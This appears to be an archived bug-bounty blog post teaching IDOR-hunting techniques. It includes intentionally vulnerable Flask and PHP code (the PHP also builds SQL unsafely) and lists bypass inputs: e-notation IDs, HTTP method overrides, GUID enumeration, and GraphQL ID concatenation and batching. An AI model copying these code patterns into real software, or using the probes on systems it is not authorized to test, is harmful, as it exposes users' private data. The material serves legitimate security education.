# More Than Broken Access

- **Source URL:** https://medium.com/@xerox0x1/more-than-broken-access-the-real-power-of-idors-a50763e9ff8d?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250517010456/https://medium.com/@xerox0x1/more-than-broken-access-the-real-power-of-idors-a50763e9ff8d
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/9596 (id 9596)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# More Than Broken Access: The Real Power of IDORs

Hi! Long Time No See, In this write-up, I’ll share some techniques to uncover hidden gold mines of IDORs. There’s often a misconception that these are “non-technical” bugs — but in my view, they actually require a solid, in-depth understanding of how the application works. The write-up’s a bit long, so grab your coffee, get comfy, and take it easy. Enjoy!

## Let’s break it down together.

# Why IDORs Are More Technical Than Most People Think?

- Let’s take a look at this Flask Code.

```
@app.route('/api/companies/<company_id>/projects/<project_id>')
def get_project(company_id, project_id):
    # Check company access
    if user_belongs_to_company(current_user, company_id):
        # Missing relationship check
        project = Project.query.get(project_id)
        return jsonify(project.to_dict())
    return jsonify({"error": "Forbidden"}), 403
```
- **What you notice here:** The code checks access at the **parent level (the company)**, but not at the **child level (the project)**. This means that a company could potentially access a project that belongs to another company without proper authorization.
- So imagine you have this data.

```
companies: [
    {name: "Apple", companyId: 100 },
    {name: "Samsung", companyId: 200 }
  ],
  projects: [
    { id: 1234, name: "Apple Project", companyId: 100 },
    { id: 5678, name: "Samsung Project", companyId: 200 }
  ],
  users: [
    {name: "Alex", companyId: 100 },
    {name: "Gabriel", companyId: 200 }
  ]
```
- According to the code above, Alex, who is working for Apple could access “Samsung Project” which is for Samsung.

```
GET /api/companies/100/projects/5678 HTTP/1.1
X-User: Alex_Token
```
# What the server did?

1. Confirms Alex has access to company 100 (Apple)

2\. Retrieves Project **5678** without checking its relationship to Company 100(Apple)

3\. Returns the unauthorized project data

A classic IDOR — but this time, with backend code for a deeper understanding. A bug, you probably not sure why it worked, **but it just did!**. Now you understand!

# Another Example: Second Order IDORs

Let’s define what a Second-Order IDOR is.

A second-order (IDOR) vulnerability occurs when an application:

- Accepts and stores user input containing unauthorized object references
- Later uses these stored references to access resources without proper authorization checks

Overwhelming? I know — but don’t worry, I’ll walk you through it with examples below.

- Consider a banking application where users create payment templates that are processed later by a scheduled task.

HTTP Request for Creating a Payment Template:

```
POST /savePaymentTemplate.php HTTP/1.1
Host: bank.com
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=1234567890abcdef
template_name=Monthly+Bill&account_id=54321&amount=500.00
```
Let’s take a look at the code

```
//Step 1
// User can specify any account_id
$userId = $_SESSION['user_id'];
$accountIdToDebit = $_POST['account_id']; 
// No validation if account belongs to user
$db->query("INSERT INTO payment_templates (user_id, template_name, account_id, amount) 
            VALUES ('$userId', '$templateName', '$accountIdToDebit', '$amount')");
//Step2
// Later, batch process without checking ownership
$db->query("UPDATE accounts SET balance = balance - {$template['amount']} 
            WHERE account_id = {$template['account_id']}");
```
Why is this code vulnerable:-

1. **In step 1**, the code stores the template with the attacker’s chosen `account_id` — **No validation at all**, which is `account_id=54321` In the above case.

**2. In step 2**, later (maybe triggered manually or by a daily cron job), the code implements the task without prior checking of ownership.

- **Now, this would lead to a miss. Why?** Because the code blindly deducts money from the victim’s account, just because the attacker snuck that ID into the stored template earlier.

Now, you can either wait for the code to execute if it’s scheduled, or trigger it yourself if there’s an execution request — and see what happens.

```
GET /triggerBatchJobs.php
Cookie: PHPSESSID=user1_session
```
- If the server processes the payment and debits **account_id=54321**
**second order IDOR** here.

Alright, here’s a flow of how to look for them:

1. Find endpoints where data is stored for future use (like saving templates, scheduling actions, etc.).
2. Try referencing another user’s ID in the input — especially if IDs are numeric or guessable.
3. Trigger the delayed action, or wait for it (e.g., scheduled jobs, email sends, payments).
4. Monitor if the action completes using the unauthorized reference.

If you want to go deeper with second-order IDORs. Check out the links in the **Reference** Section. They’re really helpful

# Wrapping up this section

## Here’s what I want to emphasize based on the examples above:-

1. If you somehow have access to the backend code — **which is nearly impossible for a bug bounty hunter** — but still, if you’re doing an authorized Pen-Test or working in a white-box environment, then you have an advantage. You’ll have clues about which workflows are valid and which ones might break.
2. IDORs aren’t just about swapping IDs. **It goes deeper than that……**

# Techniques to find more IDORs.

I hope the examples above gave you a glimpse of just how deep you can go when hunting for IDORs.

In this next section, I’ll walk you through a set of techniques I’ve collected from various write-ups, added my own insights, and take them as deeply as possible.

# E-Notations

This technique was first presented by [Keizo](https://medium.com/u/a0d71cfc27e6?source=post_page---user_mention--a50763e9ff8d---------------------------------------) in this report => [https://medium.com/@keizobugbounty/using-e-notation-to-bypass-access-control-restrictions-to-access-arbitrary-user-pii-discussions-1fa014b544d4](/@keizobugbounty/using-e-notation-to-bypass-access-control-restrictions-to-access-arbitrary-user-pii-discussions-1fa014b544d4)

**Now, What is an E-Notation?** E-notation is a shorthand way of writing very large or very small numbers using powers of 10

```
a × 10^b is written as aEb or aeb
"E" (or "e") stands for "exponent" – it means “multiply by 10 to the power of...”
"a" is the base number
"b" is the exponent
```
Examples

```
1e3 = 1 × 10^3 = 1000
2.5e2 = 2.5 × 10^2 = 250
123e0 = 123 × 10^0 = 123
5e-1 = 5 × 10^-1 = 0.5
```
How can you abuse it?

- You can add e-notation to an ID to fetch another ID. For example, using the ID `123e1` is interpreted by the backend as `1230`granting access to a different user’s resources.

Some examples taken from the report I mentioned earlier.

```
“123e0” (123 in decimal) —> 200 OK – “resources for user 123”
“123e1” (1230) —> 200 OK – “resources for user 1230"
“123.1e1” —> 1231
“123.2e1” —> 1232
“123e-1” —> 12.3 —> user 12
“123e-2” —> 1.23 —> user 1
```
- Maybe a naive developer makes a mistake like mishandling number formats. Try it next time…

# Changing Request Method

Sometimes, developers restrict only one HTTP method and forget to handle others. Try switching methods: GET → POST, POST → PATCH, PATCH → PUT…etc.

## Two Common Ways to do this:

1. Directly change the method in your request.
2. Use the **_method**

```
PUT /api/v4/user/[VICTIM] HTTP/2
Host: redacted
Cookie: redcated
Content-Length: 12
_method=PATCH
```
# Parameters

In my opinion, this would be the most common yet underrated IDOR. Let me ask you a question: How many times you dumped a JS file manually to look for parameters? As many people say, JS is really a gold mine. Looking for parameters inside JS files is crucial in your BB Hunting, You can use extensions in your Burp to ease your work, like GAP, JSMiner or CLI tools like JSluice, Still, manually is the best way!

- Jsluice is there for a while, it’s overwhelming in the beginning, but very precise. Here is a talk in NahamCon2024 for TomNomNom demonstrating the tool on YouTube! => [JSluice](https://youtu.be/6zgMglfSZkI?si=SRlE5LKsiFxCYyCI)

**If you need to deep dive into JS Analysis**, I strictly advise you to read this Blog => [Javascript Analysis For Pentesters](https://kpwn.de/2023/05/javascript-analysis-for-pentesters/)

## These parameters can:

- Accept user IDs
- Reveal additional user data with more fields
- Or even expose sensitive information like **PII**

The key is to uncover as many valid parameters as possible, swapping IDs in URL path became familiar to devs. And they handle it these days. Your best chance is to find a parameter that would be accepted by API or App. by: **Fuzzing, JavaScript analysis, Dorking, or any other creative approach**

# Request Body IDORs

- Sometimes developers restrict access based on the user ID in the URL path, but forget to validate the ID in the request body. Even if the URL is protected

```
PATCH /api/v2/users/1234
Host: redacted
Cookie: redacted
id=5678
```
# GUIDs

- GUIDs can be tricky when testing for IDORs. Right now, versions **1–5** are defined under [RFC 4122](https://datatracker.ietf.org/doc/html/rfc4122). while versions **6–8** are not officially standardized

## Understanding GUID Versions

You can identify the version of a GUID by checking the **first digit after the second hyphen.**

**For example:**

1da66357–9efb-**4**149–96da-441438e15bc4 → Version 4

3c692588–2cb1**–1**1f0–9cd2–0242ac120002 → Version 1

- Version 4 GUIDs are randomly generated, which makes them hard to guess or enumerate.

So, your best chance for abusing a GUID is when you find **version 1**

- Here is a cool writeup by “Daniel Thatcher” called in **“In GUID we trust”** explaining how you can dump the data of version 1 GUIDs and he made a small script to generate every possible GUID generated from a specific time.
- It’s really handy, you should read it. => [https://www.intruder.io/research/in-guid-we-trust](https://www.intruder.io/research/in-guid-we-trust)

## limitations

- As you can see, it’s handy if the GUID is **version 1**. Still, there are limitations — there are four other versions, and TBH, most of the GUIDs I’ve come across were **version 4**, if not all of them. So these IDORs were often accepted as low severity.

## Workflow if you find an IDOR in a GUID scenario

- If you come across a GUID. You could first change it to ones and zeros, **and see how the endpoint reacts.**

```
11111111-1111-1111-1111-111111111111
00000000-0000-0000-0000-000000000000
```
- Then, check what version it is. **If it’s version 1,** you can try the techniques we mentioned earlier.
- If it’s not, try dorking for more!
- Look for more indexed GUIDs — you might find some via the **Wayback Machine, AlienVault, or VirusTotal.**
- The key here is to highlight the impact of the issue as clearly as possible, in order to convince them to accept your findings with a reasonable CVSS score.

## One last thing.

You may find an endpoint **where a GUID is created** after sending something like an email or a user ID. If this happens, and the endpoint returns a GUID, you can try sending other users’ emails or IDs. This could leak their GUIDs and possibly allow you to collect many of them.

**A hypothetical request would be like this:-**

```
## Request
POST /api/generate-guid
...
{
  "email": "victim@example.com"
}
##Response
{
  "guid": "f3e2b190-a2c1-4f88-98fa-ec842cb0b1c9"
}
```
- Most likely, you‘ll find them in **sign-up**, **password reset** pages and **email unsubscribe** forms

# GraphQL

IDORs in GraphQL can sometimes be as simple as swapping out one ID for another, How simple it would be? check out this report [https://hackerone.com/reports/2207248](https://hackerone.com/reports/2207248) — or even trying to sneak in a second ID alongside the first, similar to what we do in JSON globbing.

**The chances are low in the second case**, since GraphQL is **strictly typed and tightly validated**… but no harm in trying!

## **Comma-separated string**

```
query {
  getUser(id: "1234,5678") {
    name
    email
  }
}
```
## **Array-style input**

```
query {
  getUser(id: ["1234", "5678"]) {
    name
    email
  }
}
```
## Stringified JSON

```
query {
  getUser(id: "{\"uid1\":1234,\"uid2\":5678}") {
    name
    email
  }
}
```
## **Newline-separation**

```
query {
  getUser(id: "1234\n5678") {
    name
    email
  }
}
```
## Batching Attacks

- A Batching attack is simply sending multiple queries or mutations in a single request to bypass a specific access control or for a DOS attack

```
query {
  getUser(id: 1) {
    name
    email
  }
}
query {
  user1: getUser(id: 1) {
    name
    email
  }
  user2: getUser(id: 2) {
    name
    email
  }
}
```
## Double ID concatenation with special characters

- You would use separators you usually use with **JSON globbing**, Think of GraphQL as being similar to JSON in how data is structured, even though **it’s not exactly the same.**

```
| (pipe)
&
&&
..
%00 (null byte — needs to be URL-encoded)
%09 (tab)
//, \\
```
**For instance.**

```
query {
  getUser(id: "1234|5678")
}
```
```
query {
  getUser(id: "1234&5678")
}
```
## Nested Variables

- Try to define another ID call, under the first one.

```
query getUser($id: ID!) {
  getUser(id: $id) {
    name
  }
}
```
- variable section

```
{
  "id": "1234,5678"
}
```
## One last note on Graphql

- If introspection is enabled on the target and you’ve discovered an IDOR vulnerability, you can feed your introspection query into an online GraphQL playground (e.g. GraphQL Voyager, Apollo Studio, or [Mead.io](https://graphql-demo.mead.io/)). This will help you discover all available fields in the schema, potentially revealing more PII, If not, you can try fuzzing for fields with tools like [GraphQLmap](https://github.com/swisskyrepo/GraphQLmap), [Clairvoyance](https://github.com/nikitastupin/clairvoyance)
- You can think of it as just adding another field to the parameters in a usual request, revealing more data.

```
query {
  getUser(id: "5678") {
    name
    email
    birthday
    invoice
    ....MORE_FIELDS...
  }
}
```
# Miscellaneous

- And last but not least, here’s a collection I’ve gathered from well-known bug hunters. Some of them have worked for me, others haven’t, but in good faith, I’ll mention them here.

```
Changing the API version e.g. “ /api/v1/user/1 => /api/v2/user/2“
Adding an extension to the end of the user ID e.g. “ /api/v4/user/1.json “
Sending the request without IDs e.g. “ /api/v4/user/ “
Changing the ID with an asterisk symbol e.g. “ /api/v4/user/* “
Sending the request with ‘page’ or ‘pageSize’ parameter e.g. “ /api/v4/user/?page=1 “
Adding a space in the tail of th id e.g. "api/v4/user/1234%20"
Capitalizing a directory e.g. "api/v1/users/1 =>403 forbidden" "api/v1/USERS/1 => 200 OK"
if you upon something like '/api/v1/self/something' Change that 'self' '/api/self/1234/something
```
# Special characters (from @ZWINK)

```
/
?
#
%2f
%3f
//
%2f%2f
```
- Try add any of the above characters at the end of your API request. e.g. `api/v1/users/1#`

# Bonus.

- You can try more techniques in @[muffymas](https://x.com/muffymas) Mindmap, Don’t forget to give him a follow => [https://xmind.app/m/CSKSWZ/](https://xmind.app/m/CSKSWZ/)

# Conclusion

- At the start of this write-up, I tried to explain why IDORs can be just as technical and impactful as many other bugs, like RCEs or XXEs. They may seem simple, but there’s real depth if you’re willing to dig.
- I’ve tried to list all possible techniques I know or learned from other hunters in the hope that it helps someone else out there
- If you find an endpoint that looks interesting, poke at it, play with it, enjoy!
- Pick your targets wisely, trust me, a good target makes you a better hunter.
- Always test manually. Automation is great, but for specific approaches.

If you spot something off in this write-up, or just want to say hi, feel free to reach out on X @xerox0x1.

Happy hacking, and may your next bug be a juicy one!

# References:-

[https://en.wikipedia.org/wiki/Universally\_unique\_identifier](https://en.wikipedia.org/wiki/Universally_unique_identifier)

[https://medium.com/@0x\_xnum/idor-leads-to-account-takeover-of-all-users-ato-27af312c8481](/@0x_xnum/idor-leads-to-account-takeover-of-all-users-ato-27af312c8481)

[https://www.intigriti.com/blog/news/idor-a-complete-guide-to-exploiting-advanced-idor-vulnerabilities](https://www.intigriti.com/blog/news/idor-a-complete-guide-to-exploiting-advanced-idor-vulnerabilities)

# Second Order IDORs useful links

[https://writeups.io/summaries/detailed-technical-analysis-of-a-less-known-attack-vector-second-order-idor-attacks/](https://writeups.io/summaries/detailed-technical-analysis-of-a-less-known-attack-vector-second-order-idor-attacks/)

[https://ozguralp.medium.com/a-less-known-attack-vector-second-order-idor-attacks-14468009781a](https://ozguralp.medium.com/a-less-known-attack-vector-second-order-idor-attacks-14468009781a)
